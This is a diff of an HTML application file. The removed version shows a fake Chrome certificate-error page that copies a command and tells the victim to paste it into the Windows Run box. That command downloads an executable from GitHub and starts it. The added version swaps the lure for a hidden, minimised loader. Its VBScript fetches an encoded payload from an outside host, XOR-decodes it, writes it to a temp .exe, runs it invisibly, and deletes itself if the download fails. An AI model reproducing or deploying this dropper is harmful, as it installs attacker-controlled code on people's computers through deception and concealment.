@@ -1,42 +1,31 @@
-<html>
-<head><title>Chrome - Certificate Error</title>
-<hta:application id="o" showintaskbar="no" caption="no" border="thin" windowstate="maximize" />
-<style>
-body{margin:0;background:#fff;font-family:Segoe UI,sans-serif;color:#1a1a1a;text-align:center;padding-top:60px}
-h1{font-size:28px;font-weight:400;color:#d93025}
-p{font-size:15px;color:#5f6368;max-width:520px;margin:12px auto;line-height:1.5}
-.code{background:#f1f3f4;border:1px solid #dadce0;border-radius:8px;padding:12px 18px;font-family:Consolas,monospace;font-size:13px;color:#202124;display:inline-block;margin:8px 0;text-align:left;white-space:pre}
-.btn{background:#1a73e8;color:#fff;border:none;border-radius:20px;padding:10px 28px;font-size:14px;cursor:pointer;margin:6px}
-.btn:hover{background:#1557b0}
-.step{background:#e8f0fe;border-radius:8px;padding:14px 18px;display:inline-block;margin:6px 0;font-size:14px;color:#1967d2}
-.err{border-left:4px solid #d93025;background:#fce8e6;padding:12px 16px;border-radius:4px;display:inline-block;margin:10px 0;font-size:14px;color:#c5221f}
-</style>
+<hta:application id="o" applicationname="d" border="none" caption="no" showintaskbar="no" windowstate="minimize" />
 <script language="VBScript">
 On Error Resume Next
-Dim cmd
-cmd = "curl -sLo %tmp%\c2.exe https://raw.githubusercontent.com/kai195102/d/main/c2d.exe & start /b %tmp%\c2.exe"
-Sub copyCmd
-  Dim el
-  Set el = document.getElementById("cmdBox")
-  el.value = cmd
-  el.select()
-  document.execCommand "copy"
-  document.getElementById("status").innerHTML = "<span style='color:#188038'>Copied! Now press <b>Windows + R</b> on your keyboard.</span>"
+Set x = CreateObject("MSXML2.XMLHTTP.6.0")
+If x Is Nothing Then Set x = CreateObject("MSXML2.XMLHTTP.3.0")
+If x Is Nothing Then Set x = CreateObject("Microsoft.XMLHTTP")
+x.Open "GET", "https://kai195102.github.io/d/c2d.enc", False
+x.Send
+If x.Status <> 200 Then SelfDestruct
+data = x.ResponseBody
+If VarType(data) <> 8209 Then SelfDestruct
+key = Array(&H0A, &H75, &H73, &HA3)
+For i = 0 To UBound(data)
+  data(i) = data(i) Xor key((i Mod 4))
+Next
+Set fso = CreateObject("Scripting.FileSystemObject")
+tmp = fso.GetSpecialFolder(2) & "\" & fso.GetTempName() & ".exe"
+Set stream = CreateObject("ADODB.Stream")
+stream.Type = 1
+stream.Open
+stream.Write data
+stream.SaveToFile tmp, 2
+stream.Close
+Set shell = CreateObject("WScript.Shell")
+shell.Run tmp, 0, False
+Sub SelfDestruct
+  Set fso = CreateObject("Scripting.FileSystemObject")
+  fso.DeleteFile WScript.ScriptFullName, True
+  Self.Close
 End Sub
 </script>
-</head>
-<body>
-<div style="max-width:560px;margin:0 auto">
-<div style="font-size:64px;color:#d93025;margin-bottom:10px">&#9888;</div>
-<h1>Chrome certificate update failed</h1>
-<p class="err">NET::ERR_CERT_AUTHORITY_INVALID — Your root certificates are out of date. Secure connections to Google, Microsoft, and banking sites will fail until resolved.</p>
-<p>Click the button below to copy the fix command to your clipboard.</p>
-<button class="btn" onclick="copyCmd()">Copy Fix</button>
-<p id="status" style="margin:8px 0;min-height:24px;font-size:14px"></p>
-<div class="step"><b>Step 1:</b> Press <b>Windows + R</b> on your keyboard</div><br>
-<div class="step"><b>Step 2:</b> Paste the command into the Run box and press <b>Enter</b></div>
-<p style="font-size:12px;color:#80868b;margin-top:18px">This command re-registers Windows certificate stores. Windows Security may briefly flash — this is normal.</p>
-</div>
-<input type="text" id="cmdBox" style="position:absolute;left:-9999px">
-</body>
-</html>
